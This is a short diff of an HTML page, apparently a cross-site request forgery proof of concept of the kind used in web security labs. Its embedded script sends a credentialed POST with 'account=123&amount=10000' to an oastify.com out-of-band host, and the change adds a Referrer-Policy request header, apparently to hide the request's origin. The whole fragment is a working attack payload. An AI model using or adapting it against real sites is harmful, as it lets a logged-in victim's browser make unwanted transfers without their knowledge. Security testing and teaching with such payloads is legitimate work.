@@ -17,7 +17,9 @@
 <script>	
 	var xmlHttp = new XMLHttpRequest();    
 	xmlHttp.open("POST", "http://qb50dkqgugi98eqdbwkanv4m0d64uuij.oastify.com", false);
-  xmlHttp.withCredentials=true;    	
+    xmlHttp.withCredentials=true;    	
+    xmlHttp.setRequestHeader("Referrer-Policy",
+    "no-referrer");
 	xmlHttp.send("account=123&amount=10000");
 </script>
 </html> 
